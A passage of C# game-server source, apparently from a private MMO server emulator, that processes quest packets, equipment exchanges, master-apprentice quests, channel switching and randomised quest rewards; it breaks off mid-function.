		public void 任务兑换110纹龙护手(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 370:
				num = 1;
				break;
			case 371:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000600);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 35 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 35)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 35);
				AddItemWithProperties(1000000555, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换110纹龙战靴(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 372:
				num = 1;
				break;
			case 373:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000635);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 5 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 5)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 5);
				AddItemWithProperties(1000000558, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务系统(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt16(封包数据, 10);
			int num2 = BitConverter.ToInt16(封包数据, 12);
			int num3 = BitConverter.ToInt16(封包数据, 14);
			任务类 value;
			switch (num)
			{
			case 8141:
			{
				DataTable dataTable = RxjhClass.得到玩家每日任务(base.Userid, base.UserName, num, 是否账号每日: true);
				if (dataTable != null && ((DateTime)dataTable.Rows[0]["FLD_LastTime"]).Day == DateTime.Now.Day)
				{
					系统提示("今天已领取过每日任务, 明天再来领取!");
					任务提示数据发送(num, 12, num3);
					return;
				}
				switch (num2)
				{
				case 1:
					if (World.是否开启任务领取 == 0)
					{
						任务提示数据发送(num, 12, num3);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
				{
					if (dataTable == null)
					{
						RxjhClass.添加玩家每日任务完成(base.Userid, base.UserName, num);
					}
					else
					{
						int id = (int)dataTable.Rows[0]["ID"];
						RxjhClass.更新玩家每日任务完成(id, base.UserName);
					}
					int num4 = 得到包裹空位(this);
					if (num4 != -1)
					{
						任务提示数据发送(num, 21, 1);
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(World.补偿的任务物品ID), num4, BitConverter.GetBytes(1), new byte[56]);
						系统提示("恭喜你获得补偿！！！！！");
						任务提示数据发送(num, 41, 0);
					}
					else
					{
						系统提示("背包没空位了。");
						任务提示数据发送(num, 51, 0);
					}
					break;
				}
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 4:
					if (任务.ContainsKey(num))
					{
						任务.TryRemove(num, out value);
					}
					任务提示数据发送(num, 41, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					break;
				}
				return;
			}
			case 386:
				switch (num2)
				{
				case 1:
					if (base.Player_WuXun < 1000)
					{
						任务提示数据发送(num, 12, num3);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
					if (base.Player_WuXun < 1000)
					{
						任务提示数据发送(num, 12, 1);
						break;
					}
					任务提示数据发送(num, 21, 1);
					base.Player_WuXun -= 1000;
					base.Player_Whtb += 1000;
					系统提示("1000 武皇币增加");
					武勋消耗提示(-1000);
					更新武功和状态();
					任务提示数据发送(num, 41, 0);
					RxjhClass.药品记录(base.Userid, base.UserName, 386, "武勋兑换武皇币", 1);
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 4:
					if (任务.ContainsKey(num))
					{
						任务.TryRemove(num, out value);
					}
					任务提示数据发送(num, 41, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					break;
				}
				return;
			case 368:
				任务兑换110纹龙甲(num, num2, num3);
				return;
			case 369:
				任务兑换110纹龙甲(num, num2, num3);
				return;
			case 370:
				任务兑换110纹龙护手(num, num2, num3);
				return;
			case 371:
				任务兑换110纹龙护手(num, num2, num3);
				return;
			case 372:
				任务兑换110纹龙战靴(num, num2, num3);
				return;
			case 373:
				任务兑换110纹龙战靴(num, num2, num3);
				return;
			case 374:
				任务兑换120绣龙甲(num, num2, num3);
				return;
			case 375:
				任务兑换120绣龙甲(num, num2, num3);
				return;
			case 376:
				任务兑换120绣龙护手(num, num2, num3);
				return;
			case 377:
				任务兑换120绣龙护手(num, num2, num3);
				return;
			case 378:
				任务兑换120绣龙战靴(num, num2, num3);
				return;
			case 379:
				任务兑换120绣龙战靴(num, num2, num3);
				return;
			case 380:
				任务兑换130金龙甲(num, num2, num3);
				return;
			case 381:
				任务兑换130金龙甲(num, num2, num3);
				return;
			case 382:
				任务兑换130金龙护手(num, num2, num3);
				return;
			case 383:
				任务兑换130金龙护手(num, num2, num3);
				return;
			case 384:
				任务兑换130金龙战靴(num, num2, num3);
				return;
			case 385:
				任务兑换130金龙战靴(num, num2, num3);
				return;
			case 221:
				义斗关势力战武勋(num, num2, num3);
				return;
			case 224:
				义斗关势力战武勋(num, num2, num3);
				return;
			case 227:
				风云之纹章武勋(num, num2, num3);
				return;
			case 230:
				风云之纹章武勋(num, num2, num3);
				return;
			case 1101:
				switch (num2)
				{
				case 1:
					if (师傅数据.STLEVEL != 5 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
					}
					else if (num3 == 1)
					{
						设置任务数据_DATA(num, 2);
						任务提示数据发送(num, 11, 2);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
				{
					if (师傅数据.STLEVEL != 5 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
						break;
					}
					师傅数据.STYHD = 0;
					师傅数据.STLEVEL = 4;
					徒弟更新师徒系统();
					Players players4 = World.检查玩家name(师傅数据.STNAME);
					if (players4 != null)
					{
						for (int m = 0; m < 3; m++)
						{
							if (players4.徒弟数据[m].TID == 师傅数据.TID)
							{
								players4.徒弟数据[m].STYHD = 0;
								players4.徒弟数据[m].STLEVEL = 4;
								players4.师傅更新师徒系统(m);
								break;
							}
						}
					}
					任务提示数据发送(num, 21, num3);
					break;
				}
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				case 4:
					break;
				}
				return;
			case 1102:
				switch (num2)
				{
				case 1:
					if (师傅数据.STLEVEL != 4 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
					}
					else if (num3 == 1)
					{
						设置任务数据_DATA(num, 2);
						任务提示数据发送(num, 11, 2);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
				{
					if (师傅数据.STLEVEL != 4 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
						break;
					}
					师傅数据.STYHD = 0;
					师傅数据.STLEVEL = 3;
					徒弟更新师徒系统();
					Players players3 = World.检查玩家name(师傅数据.STNAME);
					if (players3 != null)
					{
						for (int l = 0; l < 3; l++)
						{
							if (players3.徒弟数据[l].TID == 师傅数据.TID)
							{
								players3.徒弟数据[l].STYHD = 0;
								players3.徒弟数据[l].STLEVEL = 3;
								players3.师傅更新师徒系统(l);
								break;
							}
						}
					}
					任务提示数据发送(num, 21, num3);
					break;
				}
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				case 4:
					break;
				}
				return;
			case 1103:
				switch (num2)
				{
				case 1:
					if (师傅数据.STLEVEL != 3 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
					}
					else if (num3 == 1)
					{
						设置任务数据_DATA(num, 2);
						任务提示数据发送(num, 11, 2);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
				{
					if (师傅数据.STLEVEL != 3 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
						break;
					}
					师傅数据.STYHD = 0;
					师傅数据.STLEVEL = 2;
					徒弟更新师徒系统();
					Players players2 = World.检查玩家name(师傅数据.STNAME);
					if (players2 != null)
					{
						for (int k = 0; k < 3; k++)
						{
							if (players2.徒弟数据[k].TID == 师傅数据.TID)
							{
								players2.徒弟数据[k].STYHD = 0;
								players2.徒弟数据[k].STLEVEL = 2;
								players2.师傅更新师徒系统(k);
								break;
							}
						}
					}
					任务提示数据发送(num, 21, num3);
					break;
				}
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				case 4:
					break;
				}
				return;
			case 1104:
				switch (num2)
				{
				case 1:
					if (师傅数据.STLEVEL != 2 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
					}
					else if (num3 == 1)
					{
						设置任务数据_DATA(num, 2);
						任务提示数据发送(num, 11, 2);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
				{
					if (师傅数据.STLEVEL != 2 || 师傅数据.STYHD < 10000)
					{
						任务提示数据发送(num, 12, num3);
						break;
					}
					师傅数据.STYHD = 0;
					师傅数据.STLEVEL = 1;
					徒弟更新师徒系统();
					Players players = World.检查玩家name(师傅数据.STNAME);
					if (players != null)
					{
						for (int j = 0; j < 3; j++)
						{
							if (players.徒弟数据[j].TID == 师傅数据.TID)
							{
								players.徒弟数据[j].STYHD = 0;
								players.徒弟数据[j].STLEVEL = 1;
								players.师傅更新师徒系统(j);
								break;
							}
						}
					}
					任务提示数据发送(num, 21, num3);
					break;
				}
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				case 4:
					break;
				}
				return;
			case 9937:
				switch (num2)
				{
				case 1:
					if (base.Player_Job_leve >= 10)
					{
						任务提示数据发送(num, 12, num3);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
					if (base.Player_Job_leve >= 10)
					{
						任务提示数据发送(num, 12, 1);
						break;
					}
					任务提示数据发送(num, 21, 1);
					领取英雄职业武器();
					任务提示数据发送(num, 41, 0);
					RxjhClass.药品记录(base.Userid, base.UserName, 9937, "领取英雄职业武器", 1);
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 4:
					if (任务.ContainsKey(num))
					{
						任务.TryRemove(num, out value);
					}
					任务提示数据发送(num, 41, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					break;
				}
				return;
			case 9998:
				switch (num2)
				{
				case 1:
				{
					bool flag = false;
					for (int i = 0; i < 96; i++)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1700101)
						{
							flag = true;
							break;
						}
					}
					if (flag || World.是否开启任务领取 == 0)
					{
						任务提示数据发送(num, 12, num3);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				}
				case 2:
					任务提示数据发送(num, 21, 1);
					AddItemWithProperties(1700101, 得到包裹空位(this), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 7);
					系统提示("江湖小助手已经领取", 9, "系统提示");
					任务提示数据发送(num, 41, 0);
					RxjhClass.药品记录(base.Userid, base.UserName, 1700101, "江湖小助手", 1);
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 4:
					if (任务.ContainsKey(num))
					{
						任务.TryRemove(num, out value);
					}
					任务提示数据发送(num, 41, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					break;
				}
				return;
			case 9977:
				换线(num, num2, num3, 1);
				return;
			case 9978:
				换线(num, num2, num3, 2);
				return;
			case 9979:
				换线(num, num2, num3, 3);
				return;
			case 9980:
				换线(num, num2, num3, 4);
				return;
			case 9981:
				换线(num, num2, num3, 5);
				return;
			case 9982:
				换线(num, num2, num3, 6);
				return;
			case 9983:
				换线(num, num2, num3, 7);
				return;
			case 9984:
				换线(num, num2, num3, 8);
				return;
			case 9985:
				换线(num, num2, num3, 9);
				return;
			case 9986:
				换线(num, num2, num3, 10);
				return;
			case 9996:
				换线(num, num2, num3, 11);
				return;
			case 9997:
				换线(num, num2, num3, 12);
				return;
			}
			switch (num)
			{
			case 11:
			case 12:
			case 18:
			case 45:
			case 46:
			case 73:
			case 74:
			case 178:
			case 300:
			case 301:
			case 400:
			case 401:
			case 402:
			case 403:
			case 404:
			case 405:
			case 406:
			case 407:
			case 408:
			case 409:
			case 410:
			case 615:
			case 617:
			case 620:
			case 748:
			case 749:
			case 750:
			case 790:
			case 1002:
			case 1003:
			case 1004:
			case 1005:
			case 1006:
				try
				{
					Mission.任务(封包数据, 封包大小);
				}
				catch
				{
					MainForm.WriteLine(2, "人物转职出错" + num + "(" + base.人物全服ID + ", " + num + ", " + num2 + ", " + num3 + ")");
					switch (num2)
					{
					case 1:
						任务提示数据发送(num, 11, num3);
						break;
					case 2:
						break;
					case 3:
						任务提示数据发送(num, 31, num3);
						break;
					case 4:
						break;
					case 5:
						任务提示数据发送(num, 51, num3);
						break;
					}
				}
				return;
			}
			try
			{
				switch (num2)
				{
				case 1:
				{
					任务类 value3;
					if (!任务.ContainsKey(num))
					{
						bool flag2 = false;
						if (World.任务list.TryGetValue(num, out var value2))
						{
							flag2 = true;
							if (base.Player_Level >= value2.任务等级)
							{
								if (!任务特殊要求判断(this, value2, 扣除: false))
								{
									任务提示数据发送(num, 12, num3);
									break;
								}
								if (value2.任务类型 == 2)
								{
									DataTable dataTable2 = RxjhClass.得到玩家每日任务(base.Userid, base.UserName, num, value2.是否账号每日);
									if (dataTable2 != null && ((DateTime)dataTable2.Rows[0]["FLD_LastTime"]).Day == DateTime.Now.Day)
									{
										系统提示("今天已领取过相关任务, 明天再来领取!");
										任务提示数据发送(num, 12, num3);
										break;
									}
								}
								任务提示数据发送(num, 11, num3);
							}
							else
							{
								任务提示数据发送(num, 12, num3);
							}
						}
						else if (!flag2)
						{
							if (num == 1203)
							{
								任务提示数据发送(num, 11, num3);
								break;
							}
							系统提示("暂时没有开放此任务。");
							任务提示数据发送(num, 12, num3);
						}
					}
					else if (任务.TryGetValue(num, out value3) && value3.任务阶段ID == num3)
					{
						任务类 rW = 任务类.GetRW(value3.任务ID);
						任务阶段类 rWJD = rW.GetRWJD(num3);
						if (rWJD == null)
						{
							break;
						}
						if (rWJD.NpcID != base.当前操作NPC)
						{
							系统提示("请到相关的NPC交任务", 50, "");
							任务提示数据发送(num, 12, num3);
							break;
						}
						bool flag3 = true;
						if (rWJD.任务需要物品.Count > 0)
						{
							for (int n = 0; n < rWJD.任务需要物品.Count; n++)
							{
								if (!检查任务物品数量(rWJD.任务需要物品[n].物品ID, rWJD.任务需要物品[n].物品数量))
								{
									flag3 = false;
									break;
								}
							}
						}
						if (flag3)
						{
							if (rWJD.任务获得物品.Count > 0 && 得到包裹空位数() < rWJD.任务获得物品.Count)
							{
								系统提示("背包没有空位了， 赶快清理下吧。", 9, "任务奖励");
								任务提示数据发送(num, 12, num3);
								break;
							}
							if (rWJD.任务需要物品.Count > 0)
							{
								for (int num5 = 0; num5 < rWJD.任务需要物品.Count; num5++)
								{
									任务需要物品类 任务需要物品类2 = rWJD.任务需要物品[num5];
									if (任务需要物品类2 != null)
									{
										任务物品类 任务物品类2 = 得到任务包裹栏物品(任务需要物品类2.物品ID);
										设置任务物品(任务物品类2.物品ID, 任务物品类2.物品数量 - 任务需要物品类2.物品数量);
									}
								}
							}
							if (rWJD.任务获得物品.Count > 0)
							{
								bool flag4 = false;
								if (得到包裹空位数() < rWJD.任务获得物品.Count)
								{
									系统提示("背包没有空位了， 赶快清理下吧。", 9, "任务奖励");
									break;
								}
								if (!任务特殊要求判断(this, rW, 扣除: true))
								{
									任务提示数据发送(num, 12, num3);
									break;
								}
								for (int num6 = 0; num6 < rWJD.任务获得物品.Count; num6++)
								{
									int num7 = GetEmptyBagSlot();
									奖励任务道具(this, rWJD.任务获得物品[num6]);
									if (!flag4)
									{
										flag4 = true;
									}
								}
								if (flag4)
								{
									if (rW.任务类型 == 2)
									{
										DataTable dataTable3 = RxjhClass.得到玩家每日任务(base.Userid, base.UserName, num, rW.是否账号每日);
										if (dataTable3 == null)
										{
											RxjhClass.添加玩家每日任务完成(base.Userid, base.UserName, num);
										}
										else
										{
											int id2 = (int)dataTable3.Rows[0]["ID"];
											RxjhClass.更新玩家每日任务完成(id2, base.UserName);
										}
									}
									系统提示("恭喜你获得任务奖励。快快打开看吧。", 9, "任务奖励");
								}
							}
							任务提示数据发送(num, 11, num3 + 1);
							设置任务数据(num, num3 + 1);
						}
						else
						{
							任务提示数据发送(num, 12, num3);
						}
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				}
				case 2:
					if (!任务.ContainsKey(num))
					{
						if (World.任务list.TryGetValue(num, out var value4))
						{
							if (value4.任务正邪 != 0)
							{
								if (num == value4.RwID && base.Player_Zx == value4.任务正邪 && base.Player_Level >= value4.任务等级)
								{
									任务提示数据发送(num, 21, num3 + 1);
									设置任务数据(num, num3 + 1);
									break;
								}
							}
							else if (num == value4.RwID && base.Player_Level >= value4.任务等级)
							{
								任务提示数据发送(num, 21, num3 + 1);
								设置任务数据(num, num3 + 1);
								break;
							}
						}
						任务提示数据发送(num, 12, num3);
					}
					else
					{
						系统提示("任务条件不足，请确认条件后重新接任务。", 50, "");
						任务提示数据发送(num, 51, num3);
					}
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 4:
					if (任务.ContainsKey(num))
					{
						任务.TryRemove(num, out value);
					}
					设置任务数据(num, num3);
					任务提示数据发送(num, 41, num3);
					放弃任务删除任务道具(this, num);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					break;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(2, "MissIon" + num + "(" + base.人物全服ID + ", " + num + ", " + num2 + ", " + num3 + ")");
				MainForm.WriteLine(2, "和NPC对话--" + ex.Message);
				switch (num2)
				{
				case 1:
					任务提示数据发送(num, 11, num3);
					break;
				case 2:
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 4:
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				}
			}
		}

		public static void 放弃任务删除任务道具(Players play, int rwid)
		{
			if (!World.任务list.TryGetValue(rwid, out var value))
			{
				return;
			}
			foreach (任务阶段类 item in value.任务阶段)
			{
				foreach (任务需要物品类 item2 in item.任务需要物品)
				{
					play.设置任务物品(item2.物品ID, 0);
				}
			}
		}

		public static bool 任务特殊要求判断(Players player, 任务类 任务, bool 扣除)
		{
			if (任务.ZJPID != 0)
			{
				if (player.追加状态列表 != null && player.追加状态列表.ContainsKey(任务.ZJPID))
				{
					return true;
				}
				if (player.公有药品 != null && player.公有药品.ContainsKey(任务.ZJPID))
				{
					return true;
				}
				if (player.时间药品 != null && player.时间药品.ContainsKey(任务.ZJPID))
				{
					return true;
				}
				player.系统提示("只有拥有[" + ItmeClass.得到物品名称(任务.ZJPID) + "]状态的玩家才可以进行该任务", 10, "任务提示");
				return false;
			}
			if (任务.WPPID != 0 && 任务.WPSL != 0)
			{
				int num = player.获取背包物品位置(任务.WPPID);
				if (num == -1 || player.装备栏包裹[num].Get物品数量 < 任务.WPSL)
				{
					player.系统提示("只有拥有" + 任务.WPSL + "个[" + ItmeClass.得到物品名称(任务.ZJPID) + "]的玩家才可以进行该任务", 10, "任务提示");
					return false;
				}
				if (扣除)
				{
					player.减去物品(num, 任务.WPSL);
				}
			}
			return true;
		}

		public static void 奖励任务道具(Players player, 任务获得物品类 value2)
		{
			switch (value2.物品ID)
			{
			case 909000003:
				return;
			case 800000002:
			{
				for (int j = 0; j < value2.物品数量; j++)
				{
					int num23 = RNG.Next(0, 100);
					int num34;
					if (num23 >= 0 && num23 < 50)
					{
						num34 = RNG.Next(200002, 200008);
					}
					else if (num23 >= 50 && num23 < 80)
					{
						num34 = RNG.Next(1100015, 1100040);
						if (num34 % 2 != 0)
						{
							num34--;
						}
					}
					else
					{
						num34 = RNG.Next(300015, 300040);
						if (num34 % 2 != 0)
						{
							num34--;
						}
					}
					int num35 = player.GetEmptyBagSlot();
					if (num35 == -1)
					{
						num35 = 0;
					}
					player.AddItemWithProperties(800000002, num35, 1, num34, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000001:
			{
				for (int num16 = 0; num16 < value2.物品数量; num16++)
				{
					int num17 = RNG.Next(0, 100);
					int num18;
					if (num17 >= 0 && num17 < 30)
					{
						num18 = RNG.Next(100004, 100015);
					}
					else if (num17 >= 30 && num17 < 70)
					{
						num18 = RNG.Next(700005, 700025);
					}
					else if (num17 >= 70 && num17 < 90)
					{
						num18 = RNG.Next(300015, 300040);
						if (num18 % 2 != 0)
						{
							num18--;
						}
					}
					else
					{
						num18 = 800001;
					}
					int num19 = player.GetEmptyBagSlot();
					if (num19 == -1)
					{
						num19 = 0;
					}
					player.AddItemWithProperties(800000001, num19, 1, num18, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 909000001:
				player.人物经验 += value2.物品数量;
				player.计算人物基本数据3();
				player.更新经验和历练();
				return;
			case 909000002:
				player.Player_ExpErience += value2.物品数量;
				player.更新经验和历练();
				return;
			case 909000004:
				player.Player_Money += (uint)value2.物品数量;
				player.得到钱的提示((uint)value2.物品数量);
				player.更新金钱和负重();
				return;
			case 909000005:
				player.Player_WuXun += value2.物品数量;
				player.更新武功和状态();
				return;
			case 800000023:
			{
				for (int num24 = 0; num24 < value2.物品数量; num24++)
				{
					int num25 = RNG.Next(0, 100);
					int num26;
					if (num25 >= 0 && num25 < 30)
					{
						num26 = RNG.Next(100008, 100020);
					}
					else if (num25 >= 30 && num25 < 70)
					{
						num26 = RNG.Next(700015, 700030);
					}
					else if (num25 >= 70 && num25 < 90)
					{
						num26 = RNG.Next(300025, 300050);
						if (num26 % 2 != 0)
						{
							num26--;
						}
					}
					else
					{
						num26 = 800002;
					}
					int num27 = player.GetEmptyBagSlot();
					if (num27 == -1)
					{
						num27 = 0;
					}
					player.AddItemWithProperties(800000023, num27, 1, num26, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000024:
			{
				for (int num8 = 0; num8 < value2.物品数量; num8++)
				{
					int num9 = RNG.Next(0, 100);
					int num10;
					if (num9 >= 0 && num9 < 50)
					{
						num10 = RNG.Next(200005, 200010);
					}
					else if (num9 >= 50 && num9 < 80)
					{
						num10 = RNG.Next(1100025, 1100080);
						if (num10 % 2 != 0)
						{
							num10--;
						}
					}
					else
					{
						num10 = RNG.Next(300025, 300050);
						if (num10 % 2 != 0)
						{
							num10--;
						}
					}
					int num11 = player.GetEmptyBagSlot();
					if (num11 == -1)
					{
						num11 = 0;
					}
					player.AddItemWithProperties(800000024, num11, 1, num10, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000025:
			{
				for (int m = 0; m < value2.物品数量; m++)
				{
					int 物品属性3 = RNG.Next(1000010, 1000020);
					int num39 = player.GetEmptyBagSlot();
					if (num39 == -1)
					{
						num39 = 0;
					}
					player.AddItemWithProperties(800000001, num39, 1, 物品属性3, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000026:
			{
				for (int n = 0; n < value2.物品数量; n++)
				{
					int 物品属性4 = RNG.Next(700010, 700025);
					int num2 = player.GetEmptyBagSlot();
					if (num2 == -1)
					{
						num2 = 0;
					}
					player.AddItemWithProperties(800000001, num2, 1, 物品属性4, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000028:
			{
				for (int l = 0; l < value2.物品数量; l++)
				{
					string s = "200" + RNG.Next(1, 6) + "000";
					int num38 = player.GetEmptyBagSlot();
					if (num38 == -1)
					{
						num38 = 0;
					}
					player.AddItemWithProperties(800000028, num38, 1, int.Parse(s), 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000030:
			{
				for (int k = 0; k < value2.物品数量; k++)
				{
					Random random2 = new Random();
					int num36 = random2.Next(0, 101);
					int 物品属性2 = ((num36 >= 0 && num36 < 20) ? random2.Next(100005, 100016) : ((num36 >= 20 && num36 < 40) ? random2.Next(700008, 700026) : ((num36 >= 40 && num36 < 60) ? random2.Next(1000008, 1000021) : ((num36 < 60 || num36 >= 90) ? random2.Next(1500001, 1500006) : random2.Next(200001, 200016)))));
					int num37 = player.GetEmptyBagSlot();
					if (num37 == -1)
					{
						num37 = 0;
					}
					player.AddItemWithProperties(800000030, num37, 1, 物品属性2, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000031:
			{
				for (int i = 0; i < value2.物品数量; i++)
				{
					Random random = new Random();
					int num = random.Next(0, 101);
					int 物品属性 = ((num >= 0 && num < 20) ? random.Next(100005, 100016) : ((num >= 20 && num < 40) ? random.Next(700008, 700026) : ((num >= 40 && num < 60) ? random.Next(1000008, 1000021) : ((num < 60 || num >= 90) ? random.Next(1500001, 1500006) : random.Next(200001, 200016)))));
					int num12 = player.GetEmptyBagSlot();
					if (num12 == -1)
					{
						num12 = 0;
					}
					player.AddItemWithProperties(800000031, num12, 1, 物品属性, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000032:
			{
				for (int num20 = 0; num20 < value2.物品数量; num20++)
				{
					Random random4 = new Random();
					int num21 = random4.Next(0, 101);
					int 物品属性6 = ((num21 >= 0 && num21 < 20) ? random4.Next(100005, 100016) : ((num21 >= 20 && num21 < 40) ? random4.Next(300010, 300051) : ((num21 >= 40 && num21 < 60) ? random4.Next(1000008, 1000021) : ((num21 < 60 || num21 >= 90) ? random4.Next(500010, 500021) : random4.Next(200001, 200016)))));
					int num22 = player.GetEmptyBagSlot();
					if (num22 == -1)
					{
						num22 = 0;
					}
					player.AddItemWithProperties(800000032, num22, 1, 物品属性6, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000033:
			{
				for (int num13 = 0; num13 < value2.物品数量; num13++)
				{
					Random random3 = new Random();
					int num14 = random3.Next(0, 101);
					int 物品属性5 = ((num14 >= 0 && num14 < 20) ? random3.Next(100005, 100016) : ((num14 >= 20 && num14 < 40) ? random3.Next(300010, 300051) : ((num14 >= 40 && num14 < 60) ? random3.Next(1000008, 1000021) : ((num14 < 60 || num14 >= 90) ? random3.Next(500010, 500021) : random3.Next(200001, 200016)))));
					int num15 = player.GetEmptyBagSlot();
					if (num15 == -1)
					{
						num15 = 0;
					}
					player.AddItemWithProperties(800000033, num15, 1, 物品属性5, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			case 800000013:
			{
				for (int num3 = 0; num3 < value2.物品数量; num3++)
				{
					int num4 = 0;
					string str = "0000";
					int num5 = RNG.Next(0, 125);
					int num6 = ((num5 >= 0 && num5 <= 40) ? 8 : ((num5 > 40 && num5 <= 70) ? 9 : ((num5 > 70 && num5 <= 90) ? 12 : ((num5 <= 90 || num5 > 110) ? 15 : 13))));
					switch (num6)
					{
					case 8:
						num4 = 1;
						str = "0000";
						break;
					case 9:
						num4 = 1;
						break;
					case 12:
						num4 = 10;
						break;
					case 13:
						num4 = 5;
						break;
					case 15:
						num4 = 1;
						break;
					}
					string s2 = ((num6 != 12) ? (num6 + str + num4) : (num6 + "000" + num4));
					int num7 = player.GetEmptyBagSlot();
					if (num7 == -1)
					{
						num7 = 0;
					}
					player.AddItemWithProperties(800000013, num7, 1, int.Parse(s2), 0, 0, 0, 0, 0, 0, 0, 0, 0);
				}
				return;
			}
			}
			if (!World.Itme.TryGetValue(value2.物品ID, out var value3))
			{
				return;
			}
			switch (value3.FLD_PID)
			{
			case 1000000186:
			{
				int num30 = player.GetEmptyBagSlot();
				if (num30 == -1)
				{
					num30 = 35;
				}
